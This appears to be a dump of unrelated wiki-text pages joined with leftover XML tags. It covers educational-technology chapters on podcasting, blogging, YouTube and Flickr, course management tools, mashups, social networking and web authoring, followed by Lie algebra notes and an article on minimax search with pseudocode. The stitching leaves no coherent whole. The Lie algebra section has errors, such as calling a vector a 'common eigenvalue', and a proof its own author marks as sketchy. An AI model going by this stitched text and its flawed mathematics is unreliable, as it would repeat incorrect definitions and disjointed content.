'''6-8th Grade:''' An excellent example of a 7th &amp; 8th grade portfolio description that &quot;includes best work showing growth over time, addresses state achievement standards, illustrates experiences as a learner, shows evidence of reflection, helps students find depth and gain new perspectives, represents the uniqueness of the individual student, [while providing for an opportunity to demonstrate] Basic technology literacy...(word processing, internet research,multimedia presentations, etc.)&quot; can be found on Expeditionary Learning Schools Outward Bound's web site at [http://www.elschools.org/publications/webarchive/v10n3tt2-1d.pdf.]
----
'''9-12th Grade:''' In this example, the portfolio is used as criteria for academic eligibility for students who want to participate in non-academic public school activities who are not enrolled in public school in Idaho. The document includes the requirements to demonstrate proficiency in various subject areas and a corresponding analytic scoring guide. See [http://www.idhsaa.org/regforms/PortfolioDualEnrollment.pdf.] ''The document does not designate a particular format for the portfolio, but the situation lends itself to the e-portfolio because students from all over the state can digitize the contents of their portfolios using a word processing application, a scanner, and a digital camera, thereby expediting the process of submitting the finished product to the state activities association for review.''

      <text xml:space="preserve">===The Basics of Podcasting===

The word podcast uses the “pod” from Apple’s iPod and “cast” from broadcast which emphasizes the range of this medium (Schmidt, 2007c).  Jonassen (2008) explains a podcast as an audio recording that is saved as an MP3 file. According to Wikipedia (2009), a podcast is series of digital audio or video files placed on the Internet for anyone to subscribe to. The syndication of the delivery is the difference between a podcast and audio files that are streamed or directly downloaded. Software applications, or podcatchers, such as Apple’s iTunes can automatically download new episodes and store those files on the subscriber’s computer or other device for offline use. Podcasts use RSS, Really Simple Syndication, language and feeds which allow for the subscription to their content (Jonassen, 2008). A podcast with video enhancement is called a vodcast (Lipscomb, 2007).  

A podcast is created by recording audio using a computer, microphone, and software.  Audacity or Easypodcast are free audio software programs for Windows and Macintosh that can be used for recording and editing podcasts while Apple’s GarageBand is available only for Macintosh users.  FeedBurner or Feeder are programs that can provide the RSS feed.  The final step is loading the MP3 files and feed files to a Web server and posting the podcast link on a Web page or blog (Jonassen, 2008).

===Podcasting and Constructivism===

Constructivism promotes students creating authentic content and sharing their ideas and work with a real audience (Daniel, 2007).  Web 2.0 tools such as podcasts present opportunities for learners to actively participate in their own learning. When students create their own podcasts, they co-construct knowledge and engage in a high level of negotiation of meaning (Schmit, 2007b).  According to Seitzinger (2006), the learner-control and flexibility is the most obvious way podcasting supports constructivism. She also explains that an interview with an expert is another excellent way to use podcasts in constructive learning.  The expert can share knowledge once and the learners can access it whenever needed.  Also Seitzinger believes podcasting makes using simulations for authentic learning affordable.

As students produce the podcast for an authentic purpose they perform on an advanced cognitive level where ideas are applied and synthesized into new content.  According to Schmit (2007b), by its very nature podcasting is active, constructive and content-driven.
Schmit (2007b) states that “every podcast should start with a question for which no one in the group really has a definitive answer” (p.38). That question will guide their research, organization, analysis, and decision making which are all part of creating a podcast. Through podcasting, students write and produce for a global audience, improving their digital and literacy skills in an authentic learning environment.  They are able to share their experiences, research, ideas and points of views. It also provides students who have better oral communication skills than writing skills a chance to excel (Jonassen, 2008). 

According to Schmit (2007a), podcasting offers authentic artifacts for assessing student knowledge.  As a student creates a podcast, the teacher is able “observe factual and conceptual understanding in the cognitive domain”(Schmit, 2007a, p.16).  A student podcast that continues over a long period can serve as a portfolio of student progress.

===Podcasting in the Classroom===

Effective podcasting activities are not technology-focused activities, but “curricular focused activities with technology tools and processes which appear to help us capture, distill and distribute our ideas” (Schmit, 2007b, p.30).   

Value can be added to podcasts by expanding their content through other media such as a blog.  Ideas can be written in a blog with links to other Web sites and a podcast related to that blog entry (Jonassen, 2008).  Students can also benefit from the interactivity of our Web 2.0 world by allowing visitors to send email or leave comments on a class podcast blog (Daniel, 2007).  

Students at Willowdale Elementary School in Omaha, Nebraska produce Radio WillowWeb which according to its website http://www.mpsomaha.org/willow/Radio/
was one of the first podcasts by elementary students. One of their latest podcasts is Perfectly Presidential created by 5th graders to share what they learned about the office of the president and the election process. Inspiring Inventors is a recent second grade podcast presenting information about being an inventor. 

Our City Podcast http://learninginhand.com/OurCity/ is created for kids and by kids.  Students from around the world are invited to submit a podcast describing the city in which they live.  There’s detailed information on the website for teachers and students on how to participate.  Coulee Kids’ Podcast http://wiki.sdlax.k12.wi.us/groups/couleekids/
is created by seventh grade students at Longfellow Middle School in La Crosse, Wisconsin. Although the podcasts are created during writing class, the content is driven by an integrated learning environment, including social studies and math.

Two Australian high school science teachers and their students are using podcasts to enhance teaching and learning.  Rod Blitvich has posted the Year 12 Biology student podcasts on his website http://web.archive.org/20080731223320/web.mac.com/blitto/Blittos_Stuff/Welcome.html .  Richard Meagher's chemistry podcasts contain both audio and video files and can be found at http://meaghersclasses.podomatic.com//.

These are just a few examples of educational podcasts.  There are many interesting topics and questions for students to explore for and through podcasting.  The possibilities are unlimited.

'''Blogging as Journaling and Personal Knowledge Construction'''

Blogging in the educational world has become a new way for students to express their knowledge through writing.  “The weblog of blog was developed from early efforts to maintain a log of pages visited on the World Wide Web” (Learning Technology, 2006.).  The blog can be an ongoing journal of information that is frequently updated (World Press Organization, n.d.).  They are used for many different purposes including politics, personal enjoyment, and education.  Today educators have found many ways to use blogging as a way to build personal knowledge construction. Journal writing has always been a favorite tool of teachers; the public nature of a blog gives it a social, collaborative and intercultural dimension not otherwise present (Languages for Social Cohesion, n.d.). The use of blogs in the classroom also creates a constructivist atmosphere helping students learn and explore through their writings.

===Key Concepts of Blogging for Personal Knowledge Construction===
The use of blogs in education creates a new atmosphere for students to improve their writing skills instead of the old paper and pencil journaling.  Blogs have created a new way for students to communicate what they are learning about.  This newer technology aligns closely with the concept of constructivism. “Constructivism proposes that learning environments should support multiple perspectives or interpretations of reality, knowledge construction, and context-rich, experience-based activities&quot; (D. H. Jonassen).

Blogging builds a structure for collective learning through knowledge creation and sharing (Learning Technology, 2006). Teachers can use blogs in the classroom to promote many different learning experiences.   Blogging provides opportunities for students to engage in collaborative group work. “Group blogs form collaborative team workspaces involving tasks like information acquisition, implementation and dissemination, thinking, intelligence, improvisation, sense making, emotions, and memory” (Learning Technology, 2006).

There are five main ways educators can use blogs to enhance learning in their classrooms.  These five methods support a constructivist classroom due to their ability to let students develop skills through reflection, use of prior knowledge, and making connections with new information individually and in a group setting.  Henry Farrell identifies five major uses for blogs in education. “Teachers use blogs to replace the standard class Web page. Instructors begin to link to Internet items that relate to their course. Blogs are used to organize in-class discussions. Some instructors are using blogs to organize class seminars and to provide summaries of readings. Students may also be asked to write their own blogs as part of their course grade” (S. Downes, n.d.).

===Examples of Blog uses amoung Educators and Students===

Teachers can use blogging in their classroom regardless of what grade they teach.  There are a variety of activities teachers can use to support learning in all grade levels. Teachers can use blogs for announcements, instructional tips for students, classroom links, class based journals, and also use blogs as a discussion tool (S. Leslie, 2005). “Students as young as kindergarten can now blog on a daily basis in a variety of exciting ways” (L. Jackson, 2005).  There are many websites set up for elementary age blogging.  Some of these sites include Blogmeister created by David Warlick, Kidzblog, Thingamablog, and Think.com (L. Jackson, 2005). These sites provide various activities including options for young students to write and then illustrate what they are blogging about.  Middle and high school aged students can engage in many learning opportunities as well.  Blogs can be used to influence students to respond to thought provoking questions, reactions to photos and images, give opinions, create a portfolio of their personal writing, discuss classroom activities, write about newly learned concepts and vocabulary and more (S. Downes, n.d.). The activities listed above support high level thinking and also the concept of constructivism.  Students and teachers can use classroom blogs to really explore topics and learn from others in the classroom.  The use of weblogs in the classroom has created a new and fun way for students to communicate what they are learning and connect it to other subjects and knowledge.

      <text xml:space="preserve">===Overview===
Over the past few years, as technology progresses, more and more educators are trying to find a way to use modern visual tools in education (Mullen &amp; Wedwick, 2008).  Today's young learners have much experience with internet video and photo-sharing media such as YouTube and Flickr (Mullen &amp; Wedwick, 2008).  However, not only are these digital media tools useful for social networking, but are becoming more valid as aids for teachers in the classroom (Mullen &amp; Wedwick, 2008).  These forms of media can be used in a constructivist environment to develop meaningful learning experiences that not only develop a learner's technology literacy, but build upon a student's general knowledge (Mullen &amp; Wedwick, 2008).

===Key Concepts===
Both YouTube and Flickr can be incorporated into a constructivist classroom as valid learning tools.  In 2005, YouTube was created so users could download and share videos with the public (Mullen &amp; Wedwick, 2008).  Althouh material found on YouTube should be previewed, Trier (2007) (as cited in Mullen &amp; Wedwick,2008) cited that educators can use this as a vehicle for meaningful learning experiences (Mullen &amp; Wedwick, 2008; O'Neal, 2006).  Students can watch videos in order to become motivated and gather ideas, then create their own video and upload it on YouTube on its educational counterpart, TeacherTube (Mullen &amp; Wedwick, 2008; O'Neal, 2006).  Students are actively creating their own learning experiences through viewing and creating videos (O'Neal, 2006). 

Flickr is a photo-sharing site that allows students to interact and manipulate images, then share their products with others (Dyck, &quot;More Than Just Fun&quot;, 2008; AuCoin, n.d.).  Barton and Hamilton (1998) and Lave and Wegner (1991) (both as cited in Davies,2007) are noted as believing that Flickr has the ability to make, &quot;learning a social practice,&quot; (p. 549).  Students can work together to explore different ideas and topics, then use these images to illustrate their understanding or analyze the image (AuCoin, n.d.).

===Examples===
Mullen and Wedwick (2008) wrote about one middle school instructor who had trouble helping students to understand the meaning of a term they were discussing in class.  The teacher was able to find a video on YouTube that did not explain what the word meant, but instead created a discussion that helped students cultivate a geniuine understanding of the term (Mullen &amp; Wedwick, 2008).  This same educator also used a video on YouTube to review concepts that were presented during instructional time (Mullen &amp; Wedwick, 2008).  After one review, two of the leaners from this particular class became motivated to create their own song and choreography about the same concept they viewed on YouTube (Mullen &amp; Wedwick, 2008).  The teacher was able to upload their video on her TeacherTube account (Mullen &amp; Wedwick, 2008).  These students extended their own learning based on what they were shown on YouTube.

In using Flickr, a high school world history teacher had her students either search for pictures on Flickr or download pictures onto their Flickr accounts (AuCoin, n.d.).  These images were used to study cultural propaganda (AuCoin, n.d.).  She had students in groups analyze the images and comment on which elements of these pictures communicated propaganda (AuCoin, n.d.).  When the groups finished with their image analysis, they shared their photos and ideas with other groups who were to add other comments (AuCoin, n.d.).  In a &quot;collaborative environment&quot; students are sharing images and ideas (AuCoin, n.d.).

      <text xml:space="preserve">===Overview===
Course management tools (CMT), also known as course management systems or virtual learning environments, are used in education as a way to support teaching and learning in the classroom.  CMTs are usually run through the internet and include a variety of tools for assessment, discussion boards, uploading and downloading content, class announcements, web links, and students’ grades.  While most were originally developed for online courses, CMTs offer valuable additions to all learning environments.  They offer areas where all class content can be kept and organized for students and teachers (Virtual Learning Environment, n.d.).  Web-based course management tools can be used to support classroom instruction, and they can be used to teach online classes or distance learning classrooms (Dabbagh, 2002).

===Key Concepts===
While some CMTs are used for online or distance based learning, most are used to support classroom instruction.  CMTs can be used to capture class content and archive it, encourage students to participate since it is readily available, encourage active learning through discussion boards, facilitate peer reviews and collaboration on group projects, and promote learning through a variety of forms (Dabbagh, 2002).  CMTs allow teachers to enhance the learning process through a variety of tools not available in the traditional classroom.  Teachers can promote collaborative learning through the use of online discussions, group project organization, and navigation tools (Dabbagh, Bannon-Ritland,  &amp; Silc, 2001).  Students are not bound to learning through the classroom with CMTs.  Discussions can be carried on outside of the classroom and updates are readily available to both students and teachers.

Course management tools also create more of a constructivist learning environment, if used correctly.  Moodle’s (Moodle, n.d.) philosophy includes “a constructivist and social constructivist approach to education, emphasizing that learners (and not just teachers) can contribute to the education experience in many ways”.   Moodle, as well as other CMTs, is flexible to allow for a full range of teaching, including introductory lessons to advanced lessons (Moodle, n.d.).  Many courses that were at one point a traditional classroom have incorporated CMTs.  This transition has led to restructuring of content and features tools that allow students to create their own knowledge (Bannan &amp; Milheim, 1997; Reeves &amp; Reeves, 1997).  It is very likely that courses previously designed for instructional base learning will undergo a “pedagogical reengineering” becoming more constructivist in the process (Dabbagh &amp; Schmitt, 1998).

===Examples===
There are many course management tools on the market today, but I want to focus on two: Moodle and Blackboard.  

Blackboard- Blackboard (also known as WebCT) is used in many educational environments, including Webster University.  Blackboard is a great tool in that it can be used across a variety of courses.  Email, websites, discussion boards, assignments, and course content can all be posted online for the student to access.  The downfalls of Blackboard are that you have to buy the software, and the user interface is slightly outdated.

Moodle- Moodle is a newer program and is available free to the public.  It is open source software and provides tools for creating internet based courses or web assisted courses.  Moodle has all the features of other CMTs including forums for discussion, assignment links, grade access, web links and email, and links to wikis that students can work on together. 

Moodle has been used in many schools ranging from elementary to college.  One particular school in Grand Rapids Michigan has found many uses for Moodle in the classroom.  Some teachers developed a course to be taken at home, while others were able to enroll students in a course that used a particular eBook as a resource (DeVaney, 2008).

While there are many course management tools out there, certain ones might be more beneficial for particular teachers.  Some of the older programs are very basic in nature, while the new sites offer many links and tools to provide the students.  CMTs offer every teacher an avenue to diversify their curriculum and allow teachers to create a more constructivist classroom environment.

This Wiki section discusses Mashups.  This section will review the history of the term, including the &quot;original Mashup.&quot;  It will then discuss what Mashups are known as currently.  This section will make direct connection to Mashups and the relevance they hold in the Constructivism Learning Theory.  Lastly, this section will take a look at the makeup of Mashups as well as the various functions they utilize, including various contextual uses for the classroom.

===Key Concepts===
Historically, the original term Mashup came into use during the hay-day of pop culture.  The term was used when vocal and instrumental tracks from vastly different genres of music were mixed together (Schulz, Sielaff, &amp; Tuf, 2008).   This, now outdated, procedure parallels to the computer mashups this section discusses in the way in which they are created. 
 
According to the Wikipedia article a mashup is a, &quot;Web application that combines data from one or more sources into a single integrated tool,&quot;(Wikipedia Mashup, 2009).   Mashups may include, but are not limited to images, data , video, and audio files.  Any or all of these file types can be sourced from various web locations and pulled into a single view otherwise known as a Mashup.  While this technology is known, it is still emerging and is being developed more and more everyday.  
 
Constructivism is a hands-on learning approach where learners become active in the learning process.  The use of manipulative's is one way to make a classroom more constructivism-friendly.  Mashups are simply a web-based manipulative.  Students have the opportunity to achieve learning goals by creating mashups using various web sources.  For instance, students studying mammals could create a mashup containing images, sounds, and videos of different mammals.

===Examples===
Not a lot of Mashups are widely available with the intent to be used with specific grade levels or subjects, but more as a tool to aid in learning.  Most of the most common Mashups include video, photo, and mapping applications (Schulz, Sielaff, &amp; Tuf, 2008).
  
Wiki has an application called WikiCrimes (WikiCrimes, 2009).   It is a wiki where users report and review different crimes by putting &quot;pins&quot; in a GoogleMap (GoogleMaps, 2009).   All crimes classified by category such as robbery, assaults, and battery.  This application could be used in a classroom in the subject of Social Studies, provided the topic was age-appropriate.  Students could become crime watchers in their own neighborhoods, or perhaps students could do comparing and contrasting of their neighborhoods statistics to other neighborhoods.  
 
Another example is Flickervision (Troy, 2009).  Flickervision is a real-time image mapping display.  Essentially users all over the world upload images to the site, viewers see the pictures appear in real-time and from the specific place on the map from which they were sent.  Students of any grade level could easily use this application to be introduced to various cultural and/or geological differences from around the world.  

A final example for this section of a Mashup is GoogleMaps (GoogleMaps, 2009).   GoogleMaps is an application that incorporates text (written driving directions) and images (maps) together.  Images are in map, satellite, and terrain views.  Students of any grade level could use this Mashup to discover different cities, for mapping purposes, to explore various terrain, or perhaps to estimate distances between locations.  GoogleMaps could be used to elaborate on Social Studies or Geography lessons easily.

      <text xml:space="preserve">===Overview===

In today’s day and age, social networking sites, such as My Space and FaceBook, seem to reign supreme when it comes to social interaction amongst the peers of today’s digital generation.  According to an article entitled “At Social Network Sites, Talk Includes School”, 96% of students age 9-17 reported using some type of social networking site on a regular basis, and a surprising 60% of these students reported using these sites to connect with their peers for educational purposes, such as school project collaboration (2007).  In response to the recent popularity of social networking sites in the secular world, in this section of chapter 8, we will examine the use of social networking sites in the educational realm, analyze how social networking sites relate to and complement constructivism, and discuss how social networking sites are currently being used across subjects areas and grade levels in today’s classrooms.Also what are these sites really for? All this and more is down below.

===Key Concepts===

'''Social Networking &amp; Social Networking Sites'''

A “social network” is defined as the complex web of professional and/or personal relationships or ties that exist between people or groups of people within a culture (Rodriguez, Manzanares, Ronzio, &amp; Zimber, n.d.).  Typically, social networks can benefit individuals by helping them find new friends, employment opportunities, romantic partnerships, etc. (LeFever, 2007).  For example, you need a job, and your friend Sam knows Chris who knows Shelly, and Shelly’s friend Kate is going to “put in a good word for you” with her employer (LeFever, 2007). Author Lee LeFever reports that even though these social networks can be exponentially beneficial to individuals, they are only as valuable as the connections that can be seen and directly utilized because oftentimes, social connections are invisible and go unnoticed (2007).  However this problem has recently been alleviated by the advent of a category of websites called “social networking sites”.  Social networking sites are technological tools that bring these unseen social connections / networks to the forefront and make them more visible, tangible, and accessible in people’s everyday lives (Rodriguez et al., n.d.).  

Social networking sites operate by allowing clients to sign up and create a user profile containing basic personal information, such as name, age, birthday, occupation, likes, dislikes, interests/hobbies, etc.  Once a member of the service, users are allowed to search the website’s database to find and connect with other users that they know or would like to know.  Once these users become “friends” via the website, the users have a shared visible connection on the site that can be viewed by the public.  These public connections posted on the website allow users to see and keep track of “who they know, who their friends know, who their friends’ friends know”, and so forth (LeFever, 2007, no page numbers).  People are no longer distant strangers to one another, and these now visible social connections allow users to unlock the hidden potential of their social network (LeFever, 2007).  According to author Fran Smith, social networking sites allow individuals to bond or connect through a mutual topic of interest or around a shared idea (2007).         

'''Social Networking Sites &amp; Constructivism'''

As we have previously discussed in this WikiText, constructivist theory contends that learning is an active and social procedure in which learners engage in “active dialog” with their peers and their teachers, and establish and participate in interactive learning communities where teachers and students alike collaborate to solve real world problems (Educational Broadcasting Corporation, 2004; Kearsley, 2009).  According to author Tim DiScipio, social networking sites complement these aspects of constructivism very well because they provide students with a tangible venue to connect, communicate, and collaborate about their learning (2008).  Moreover, DiScipio insists that social networking sites are relevant to constructivism because while using these sites, “students can collaborate using tools such as email, blogs, and wikis to create, invent, and showcase their work in a way that unlocks intrinsic motivation and advances learning outcomes” (2008,no page numbers).

===Examples===

'''Social Networking Sites in Today's Classrooms'''

Even though the idea of using social networking sites in education is a fairly new idea, a variety of social networking sites are currently being used across subject areas and grade levels in many classrooms around the world.  Currently, many educators are using Ning, an online service that allows users to generate, customize, and share their own social networks, to create their own classroom-based social networks for educational purposes (Confino, 2007).  For example, in the primary grade age bracket, a second grade social studies class is using a Ning-created social networking site called “World Village” to learn about different cultures by connecting with age appropriate peers from countries all over the world (Cofino, 2007).  The class also uses the social network to collaborate with classrooms around the world on social studies projects.  Similarly, a fifth grade English class is using another Ning-created social networking site called “Xtreme Learning” to connect with several other U.S. and international fifth grade classes to discuss reading and literature (Cofino, 2007).

Social networking sites are quickly becoming commonplace in higher grade levels as well.  For example, an eighth grade science class has created a Ning social networking site called “Big Dog Science” to “share class notes, project ideas, absentee work, quiz and test study material, peer tutoring and general classroom information” (Cooper, n.d., no page numbers).  In the high school age bracket, a theatre class at Garden City High School in New York is using a Ning social networking site called “GCHS Theater Arts” to connect and reflect about performances and theater-related issues (“Social Networks”, 2009).    

In addition to using Ning-created social networking sites, some university professors have started using public social networking sites in their college classes.  For example, David Perry, an Emerging Media Professor at the University of Texas – Dallas, reports using Twitter, a public social networking site that allows users to create, share, and receive “tweets” or short 140 character messages from their “friends” on the network, in his classroom (2009).  Perry reports that he has students use the social networking site to “tweet” about the connections they have made between real-world situations and classroom content and any questions about course content/material that happen to arise while students are completing their class work/homework (2009)

      <text xml:space="preserve">===Overview===
This chapter defines web authoring and gives tips for making web pages available to all users. In addition, several popular web authoring tools are named and described. This chapter also discusses collaborative research and the positive effects of using it in the classroom.

===Key Concepts===



'''Web Authoring'''


Web authoring is a category of software the enables the author to develop a website, and also the ability to design and create a web site by writing the site’s code and text (Webopedia). According to Horton, when it comes to creating a website, there are three ways to do so. First, an author can write their own code and create their own content using the HTML format by hand. With this method, an HTML text editor is used to simplify web page creation. Using this software still requires the author to work in text mode, but it is more workable. A second way is to use web page design software where the author just adds the content to the page as opposed to putting in all of the code necessary. With this method, the author never has to see the code and it works just like you would type a word processing document. The final method is to use a courseware system that combines tools to deliver online instruction. This method is if you are designing an online class or are instructing someone. Web authoring connects to constructivism because students can create their own websites. It is a great way for them to show what they have learned. An example is after having learned and completed an assignment on the moon, the students can create a website discussing the phases, and the other details that they learned about. 



'''Considering the Users'''

As the author designs the page, it is important to consider all users. Since people use computers in many ways, it is imperative that the author follows guidelines so that the viewers can see, manage and navigate the site that the author is creating. This affects the colors chosen, the size of font, and the fact that some people may use older and slower technology. In addition, pages should be simple and use valid HTML elements as well (University of Edinburgh).



'''Web Authoring Tools'''

The Centre for Learning and Performance Technologies lists the following programs that were voted top tools for learning by learning professionals world wide. Dreamweaver is a web development tool that designs, develops, and maintains websites and applications. Firebug edits and debugs CSS, HTML, and JavaScript live in any web page. Flash is an advanced authoring platform designed to create interactive websites and other digital experiences. Google Page Creator is a free source that creates and publishes web pages. Notepad++ is a free source code editor that supports a variety of programming languages using Windows. Nvu is also a free authoring platform that works for not only Windows, but also Mac and Linux. 



'''Collaborative Research'''

The University of Oregon has developed a Collaborative Research Model. This model is designed for students to work together toward a decision on a common problem or goal. In the model there are five principles: Focusing on Learning Outcomes, Developing Communication, Posing the Problem, Generating Multiple Perspectives, and Making Informed Decisions.

In focusing on learning outcomes, the learner needs to be actively engaged in the process. Authentic tasks should be given, and those tasks should be measurable and provide students with an opportunity for increased learning, the ability to retain knowledge longer, and increased performance on future projects. The second principle, developing communications, requires the learner to have an open mind and attempt to understand others’ points of view. In posing the problem, the learner is also actively engaged in their search of a question for research. The fourth principle involves the learner to generate multiple perspectives. The learner should engage others by restating information, by being empathetic towards the speaker, and by thinking critically. The final principle to collaborative research is decision making. During decision making, the learners are determining claims and counterclaims, creating shared definitions, sharing their perspectives, and evaluating results.

Collaborative research is designed to develop strong learning experiences for students, and has benefits for both the teacher and the learner. It connects to constructivism because it is the essence of what constructivism is. The students guide the learning and are actively engaged in the process. The teacher is the facilitator as the students work to communicate with one another and make informed decisions.

===Examples===
Web Authoring can be applied to the classroom. Students can design and create their own websites. After having researched a topic, a way to present that information could be on a website. Depending on the age, some students in high school could deal with the code aspect of a website. In elementary school, students could use their teacher’s website and a template to share what they have learned. 



Collaborative research can also be applied in the classroom in many ways. One example would be for students to create and research a service learning project. Upper elementary, middle, and high school students could research a country or culture. Within that, they could find out what serious needs are for that area, and then design a fundraiser or drive to help support that particular country. Knowledge is extended, and it covers several subject areas.

      <text xml:space="preserve">Let &lt;math&gt;V&lt;/math&gt; be a vector space. &lt;math&gt;(V, [, ])&lt;/math&gt; is called a Lie algebra if it is equipped with the bilinear operator &lt;math&gt;V \times V \to V&lt;/math&gt;, denoted by &lt;math&gt;[, ]&lt;/math&gt;, subject to the properties: for every &lt;math&gt;x, y, z \in V&lt;/math&gt;
*(i) [x, x] = 0
*(ii) [x, [y, z]] + [y, [z, x]] + [z, [x, y]] = 0
(ii) is called the Jacobi identity.

Example: For &lt;math&gt;x, y \in \mathbf{R}^3&lt;/math&gt;, define &lt;math&gt;[x, y] = x \times y&lt;/math&gt;, the cross product of &lt;math&gt;x&lt;/math&gt; and &lt;math&gt;y&lt;/math&gt;. The known properties of the cross products show that &lt;math&gt;(R^3, [,])&lt;/math&gt; is a Lie algebra.

Example: Let &lt;math&gt;\operatorname{Der}(V) = \{ D \in \operatorname{Ext}(V) : D(x y) = (Dx) y + x Dy \}&lt;/math&gt;. A member of &lt;math&gt;\operatorname{Der}(V)&lt;/math&gt; is called a derivation. Define &lt;math&gt;[x, y] = xy - yx&lt;/math&gt;. Then &lt;math&gt;[x, y] \in \operatorname{Der}(V)&lt;/math&gt;.

'''Theorem''' ''Let &lt;math&gt;V&lt;/math&gt; be a finite-dimensional vector space.
*''(i) If &lt;math&gt;\mathfrak{g} \subset \mathfrak{gl}_k(V)&lt;/math&gt; is a Lie algebra consisting of nilpotent elements, then there exists &lt;math&gt;v \in V&lt;/math&gt; such that &lt;math&gt;x(v) = 0&lt;/math&gt; for every &lt;math&gt;x \in \mathfrak{g}&lt;/math&gt;.''
*''(ii) If &lt;math&gt;\mathfrak{g}&lt;/math&gt; is solvable, then there exists a common eigenvalue &lt;math&gt;v \in V&lt;/math&gt;.''

'''Theorem (Engel)''' ''&lt;math&gt;\mathfrak{g}&lt;/math&gt; is nilpotent if and only if &lt;math&gt;\operatorname{ad}(x)&lt;/math&gt; is nilpotent for every &lt;math&gt;x \in \mathfrak{g}&lt;/math&gt;.''&lt;br /&gt;
Proof: The direct part is clear. For the converse, note that  from the preceding theorem that &lt;math&gt;\operatorname{ad}(\mathfrak{g})&lt;/math&gt; is a subalgebra of &lt;math&gt;\mathfrak{n}_k&lt;/math&gt;. Thus, &lt;math&gt;\operatorname{ad}(\mathfrak{g})&lt;/math&gt; is nilpotent and so is &lt;math&gt;\mathfrak{g}&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt;

'''Theorem''' ''&lt;math&gt;\mathfrak{g}&lt;/math&gt; is solvable if and only if &lt;math&gt;[\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; is nilpotent.''&lt;br /&gt;
Proof: Suppose &lt;math&gt;\mathfrak{g}&lt;/math&gt; is solvable. Then &lt;math&gt;\operatorname{ad}[\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; is a subalgebra of &lt;math&gt;\mathfrak{b}_k&lt;/math&gt;. Thus, &lt;math&gt;\operatorname{ad}[\mathfrak{g}, \mathfrak{g}] \subset \mathfrak{n}_k&lt;/math&gt;. Hence, &lt;math&gt;\operatorname{ad}[\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; is nilpotent, and so &lt;math&gt;[\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; is nilpotent. For the converse, note the exact sequence:
:&lt;math&gt;0 \longrightarrow [\mathfrak{g}, \mathfrak{g}] \longrightarrow \mathfrak{g} \longrightarrow \mathfrak{g} / {[\mathfrak{g}, \mathfrak{g}]} \longrightarrow 0&lt;/math&gt;
Since both &lt;math&gt;[\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; and &lt;math&gt;\mathfrak{g} / [\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; are solvable, &lt;math&gt;\mathfrak{g}&lt;/math&gt; is solvable. &lt;math&gt;\square&lt;/math&gt;

'''3 Therorem (Weyl's theorem)''' ''Every representation of a finite-dimensional semisimple Lie algebra:
:&lt;math&gt;\mathfrak g \to \operatorname{End}(V)&lt;/math&gt;
''is completely reducible.''&lt;br /&gt;
Proof: It suffices to prove that every &lt;math&gt;\mathfrak g&lt;/math&gt;-submodule has a &lt;math&gt;\mathfrak g&lt;/math&gt;-submodule complement. Furthermore, the proof reduces to the case when &lt;math&gt;W&lt;/math&gt; is simple (as a module) and has codimension one. Indeed, given a &lt;math&gt;\mathfrak g&lt;/math&gt;-submodule &lt;math&gt;W&lt;/math&gt;, let &lt;math&gt;E \subset \operatorname{Hom}(V, W)&lt;/math&gt; be the subspace consisting of elements &lt;math&gt;f&lt;/math&gt; such that &lt;math&gt;f|_W&lt;/math&gt; is a scalar multiplication. Since any commutator of elements &lt;math&gt;f \in E&lt;/math&gt; is zero (that is, multiplication by zero), it is clear that &lt;math&gt;E / [E, E]&lt;/math&gt; has dimension 1. &lt;math&gt;E&lt;/math&gt; may not be simple, but by induction on the dimension of &lt;math&gt;E&lt;/math&gt;, we can assume that. Hence, &lt;math&gt;E&lt;/math&gt; has complement of dimension 1, which is spanned by, say, &lt;math&gt;f&lt;/math&gt;. It follows that &lt;math&gt;V&lt;/math&gt; is the direct sum of &lt;math&gt;W&lt;/math&gt; and the kernel of &lt;math&gt;f&lt;/math&gt;. Now, to complete the proof, let &lt;math&gt;W&lt;/math&gt; be a simple &lt;math&gt;\mathfrak g&lt;/math&gt;-submodule of codimension 1. Let &lt;math&gt;c&lt;/math&gt; be a Casimir element of &lt;math&gt;\mathfrak g \to \operatorname{End}(V)&lt;/math&gt;. It follows that &lt;math&gt;V&lt;/math&gt; is the direct sum of &lt;math&gt;W&lt;/math&gt; and the kernel of &lt;math&gt;c&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt; (TODO: obviously, the proof is very sketchy; we need more details.)

      <text xml:space="preserve">The minimax search is especially known for its usefulness in calculating the best move in two player games where all the information is available, such as chess or tic tac toe (Muller, 2001). It consists of navigating through a tree which captures all the possible moves in the game, where each move is represented in terms of loss and gain for one of the players. It follows that this can only be used to make decisions in zero-sum games, where one player’s loss is the other player’s gain. Theoretically, this search algorithm is based von Neumann’s minimax theorem which states that in these types of games there is always a set of strategies which leads to both players gaining the same value and that seeing as this is the best possible value one can expect to gain, one should employ this set of strategies (Kulenovic, 2008).

== Description ==

The first step is to give each node a value in terms of utility for player 1. These values are derived from the values of the terminal nodes, which each represent an end of the game. Each level of the tree alternates between player 1’s move, who is trying to maximize her score, and player 2’s move, who is trying to minimize player 1's score in order to undermine her success. If the level above the terminal nodes represents player 2’s possible moves, then the value of the nodes will be the lowest value among those of their children, the minimum. On the other hand, if this level represents the possible moves for player 1, the value of its nodes will be the highest value among those of their children. Finally, once all the nodes have been assigned values, it is decision time for player 1 who just picks the move which will lead to the highest value (Russell &amp; Norvig, 1995). Figure 1 illustrates this process.


[[File:Illustration_of_the_Minimax_Search.JPG|600px|center]],&lt;b&gt;&lt;center&gt;Figure 1 : Assigning a value to the nodes and deciding the best move.&lt;/b&gt;&lt;/center&gt;

== Pseudocode  ==
This pseudocode is adapted from a version presented by Russell and Norvig (1995).
&lt;pre&gt;
function minimaxDecision (game)
	for each possible move in game
		moveValue = minimaxValue(state, game)

	return move with highest value

function minimaxValue (state, game)
	if terminal node
		return utility

	if player 1's turn
		return highest value of children

	if player 2's turn
		return lowest value of children
&lt;/pre&gt;

== Complications, Shortcomings and Future Directions ==
One shortcoming of this search is that it assumes that the opponent will act in such a way that he will effectively minimize your gains and maximize his own. However, this will not hold if your opponent is irrational, a beginner or a human who can be mistaken. In some cases, it may be best to gamble and hope that your opponent will not notice a subtle countermove (Moore &amp; Knuth, 1975). 

